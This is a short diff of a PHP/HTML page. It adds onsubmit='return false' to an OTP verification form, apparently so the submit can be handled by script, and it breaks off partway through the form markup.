@@ -92,7 +92,7 @@ $device = $_SERVER['HTTP_USER_AGENT'];
                                         ?>
                                         <!-- OTP FORM  -->
                                         <div id="otp-form" class="contact-form" dir="ltr" style="display: none;">
-                                            <form method="POST" action="../controllers/verify-otp.php">
+                                            <form method="POST" action="../controllers/verify-otp.php" onsubmit="return false">
                                                 <!-- action="../controllers/verify-otp.php" -->
                                                 <h5 class="gold-grad" style="text-align: center;">
                                                     OTP has been sent to 
